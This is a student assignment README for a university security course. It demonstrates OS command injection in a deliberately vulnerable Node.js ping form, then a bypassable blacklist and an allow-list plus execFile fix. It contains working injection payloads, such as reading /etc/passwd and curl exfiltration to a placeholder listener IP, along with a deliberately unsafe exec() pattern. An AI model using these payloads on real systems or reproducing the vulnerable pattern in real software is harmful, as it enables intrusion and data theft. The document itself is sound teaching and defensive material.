# Web Server Security — OS Command Injection (In-band)

IT-30001 Cyber Security, Autumn 2026 · Instructor: Dr. Soumyadev Maity
Category: **OS Command Injection** · Variant: **In-band (command output returned)**

A "Network Diagnostic Tool" (a web form that pings a host). One server, two pages:
a **Vulnerable** page and a **Fixed** page. For authorised testing on our own app only.

---

## Ownership (Table 3)

| Member name | Roll number | Category | Variant implemented |
|---|---|---|---|
| Kavyan Hembrom | IIT2024245 | OS Command Injection | In-band (command output returned) |
| `<member 2>` | `<roll>` | `<category>` | `<variant>` |
| `<member 3>` | `<roll>` | `<category>` | `<variant>` |
| `<member 4>` | `<roll>` | `<category>` | `<variant>` |

> This file documents only the **OS Command Injection — In-band** variant (Kavyan's part).

---

## Run

```bash
npm install
node server.js        # -> http://localhost:3000
```

Open <http://localhost:3000>:
- **Vulnerable version** — the flaw. Try the injection payloads here.
- **Fixed version** — a dropdown to pick the real fix (`/api/fixed`) or the weak
  blacklist (`/api/fixed-weak`) so you can show the blacklist being bypassed.

One server, one port — no restart needed to switch between vulnerable and fixed.

## Files

- `server.js` — the whole app. Three POST routes, each in a clearly commented block:
  - `/api/vuln` — the flaw: `exec("ping -c 1 " + host)` → runs via `/bin/sh -c`.
  - `/api/fixed-weak` — a bad blacklist (bypassable on purpose).
  - `/api/fixed` — the real fix: allow-list + `execFile`.
- `public/index.html` — landing page with the two links.
- `public/vulnerable.html` — the vulnerable form.
- `public/fixed.html` — the fixed form (with the endpoint dropdown).
- `package.json` — one dependency, `express`.

---

## Payload cheat-sheet (all tested)

**On the Vulnerable page** (posts to `/api/vuln`):

| # | Payload (Host field) | What it proves |
|---|---|---|
| 1 | `127.0.0.1; cat /etc/passwd` | In-band: file contents returned in the response |
| 2 | `127.0.0.1 \| whoami` | Pipe metacharacter also chains commands (→ your username) |
| 3 | `127.0.0.1; sleep 5` | Blind time-based: response hangs ~5 s |
| 4 | `127.0.0.1; curl http://<YOUR_IP>:8000/$(whoami)` | Blind out-of-band: exfil to a listener you control |

For #4, first run `python3 -m http.server 8000`, then watch the request arrive with your
username in the path. (Your variant is in-band, so #1/#2 are the core demo; #3/#4 are bonus.)

**On the Fixed page:**

| Endpoint (dropdown) | Payload | Result |
|---|---|---|
| `/api/fixed-weak` | `127.0.0.1; cat /etc/passwd` | `[blocked] ';' is not allowed` |
| `/api/fixed-weak` | `127.0.0.1 $(id)` | **BYPASSED** — `id` runs (no `;`). Blacklist is broken. |
| `/api/fixed` | any injection payload | `[rejected] invalid host` |
| `/api/fixed` | `127.0.0.1` | normal ping output — legitimate use still works |

---

## Table 2 writeup

### (a) Vulnerable implementation
`server.js`, the `/api/vuln` route. The flawed line is:

```js
const cmd = "ping -c 1 " + host;     // host comes straight from req.body
exec(cmd, ...)                        // exec() runs it through /bin/sh -c
```

`exec()` does not run the program directly — it spawns a shell (`/bin/sh -c "<string>"`)
and hands it the whole concatenated string. The shell, not our code, decides where one
command ends and the next begins.

### (b) Working exploit
On the Vulnerable page, Host field: `127.0.0.1; cat /etc/passwd`. The server builds
`ping -c 1 127.0.0.1; cat /etc/passwd`, the shell runs *two* commands, and the contents
of `/etc/passwd` come back in the response (in-band). Also: `| whoami` (pipe),
`; sleep 5` (blind/time-based), and `$(whoami)` out-of-band exfil via `curl`.

### (c) Root cause
Untrusted user input is concatenated into a shell command string. Because a shell parses
the result, the metacharacters `;` `|` `&` `` ` `` `$()` are interpreted as *operators*
(command separators / substitution), not as literal data — so the attacker's input
becomes new commands.

### (d) Mitigation implemented
`server.js`, the `/api/fixed` route, two layers:

1. **Allow-list validation** — reject anything that is not a plausible host *before* it
   reaches the OS: `const HOST_RE = /^[a-zA-Z0-9][a-zA-Z0-9.-]*$/;` (letters, digits, dot,
   hyphen only, and it must *start* with a letter/digit), plus a length cap. Every injection
   payload contains a character outside that set, so it is refused with `[rejected] invalid host`.
   The "must start with a letter/digit" rule also blocks **argument injection** (see Edge cases):
   `-f` / `--help` would otherwise pass and be read by `ping` as a flag.
2. **Avoid the shell — `execFile`, not `exec`** — `execFile("ping", ["-c","1",host])`
   goes straight to the OS (`execve`) with an **argv array**, so `host` is passed as *one
   literal argument*. There is no shell, no tokenization, so `;` `|` `$()` are inert bytes.

The exact payload that leaked `/etc/passwd` on the Vulnerable page now returns
`[rejected] invalid host` on `/api/fixed` — screenshot that for deliverable (d).

**Why keep the weak `/api/fixed-weak` route?** To show *in the video* that a blacklist is
not a fix: blocking `;` is trivially bypassed with `$(id)` or `| id`. That contrast earns
marks — it proves the real fix is structural, not a character filter.

### (e) Other mitigations (theory)
- **Avoid the shell / argv vector** *(what I implemented)* — use `execFile`/`spawn`/
  `posix_spawn`. No shell is invoked, so no metacharacter parsing; strongest fix.
- **Allow-list input validation** — accept only input matching a strict known-good pattern.
  Defence-in-depth. A **blacklist** is explicitly not enough (too many chars/encodings).
- **Least privilege** — run the app as a low-privileged, confined user (container, seccomp).
  Doesn't prevent injection but caps the blast radius.

---

## Edge cases (tested)

| Input | Vulnerable `/api/vuln` | Fixed `/api/fixed` |
|---|---|---|
| newline `%0a cat /etc/passwd` | runs (newline is a shell separator) | `[rejected]` |
| `$(whoami)` / `` `whoami` `` | command substitution runs | `[rejected]` |
| `127.0.0.1 && id` | AND-chains the command | `[rejected]` |
| empty host | `ping` usage error | `[rejected]` |
| `-f`, `--help` (**argument injection**) | ping treats it as a flag | `[rejected]` (leading-dash rule) |
| `127.0.0.1`, `google.com` (legit) | works | works |

**Argument injection** is the non-obvious one: `execFile` stops a new *command* from running,
but without the leading-character rule an input like `-f` is still passed to `ping` as an
*option*. The fix anchors the allow-list to start with a letter/digit. (Theory alternative:
pass `--` before the host so everything after is treated as operands.)

---

## The one sentence that gets full marks at the viva
> The vulnerable path goes `exec → /bin/sh -c → fork/execve`, so the shell tokenizes my input
> and interprets `;` `|` `&` `$()` `` ` `` as operators. The fixed path calls `execFile`, which
> goes straight to `execve("ping", ["ping","-c","1",host])` with no shell in the chain — so
> there is no tokenization step and those characters are inert bytes inside one argv element.

## Likely viva questions (be ready)
- *Why does `execFile` stop the attack but `exec` doesn't?* → No `/bin/sh -c`; argv array, no tokenization.
- *Isn't the regex the real fix?* → It's defence-in-depth; the structural fix is removing the shell. Show `/api/fixed-weak` being bypassed to prove a filter alone fails.
- *Could the allow-list still be bypassed?* → Not for injection; an over-broad pattern could allow odd hostnames, but argv is the primary control.
- *In-band vs blind?* → In-band returns output in the response (`cat /etc/passwd`); blind infers success via timing (`sleep 5`) or an out-of-band callback.
- *Why does the `$(id)` bypass show output in ping's error?* → The shell substitutes `$(id)` before `ping` runs, so `id`'s output becomes ping's argument and is echoed back in "Name or service not known" — proof the injected command executed.
